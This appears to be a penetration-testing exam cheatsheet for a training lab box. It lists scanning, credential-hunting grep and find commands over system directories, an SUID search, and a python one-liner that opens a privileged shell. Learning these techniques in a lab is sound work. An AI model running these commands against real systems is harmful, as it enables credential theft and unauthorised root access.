# Cheatsheet — The Onboarding Box

## Targets

- **onboarding01** — T1 exam target; ssh + secrets somewhere on disk

## Useful commands

```bash
nmap -sV -sC <ip>
grep -rIlnE 'passw|cred|login' /opt /srv /var /etc 2>/dev/null
find / -xdev -type f \( -name '*.txt' -o -name '*welcome*' \) 2>/dev/null

find / -perm -4000 -type f 2>/dev/null          # SUID inventory
find / -perm -u=s -type f 2>/dev/null           # same thing, different syntax
python3 -c 'import os;os.execl("/bin/sh","sh","-p")'  # GTFOBins exec
```

## Concepts

- Loot-first: on an internal box, filesystem contents *are* the OSINT
- SUID + interpreter = instant root shell (not just a file read)
- Exam rule: every technique needed was taught this tier
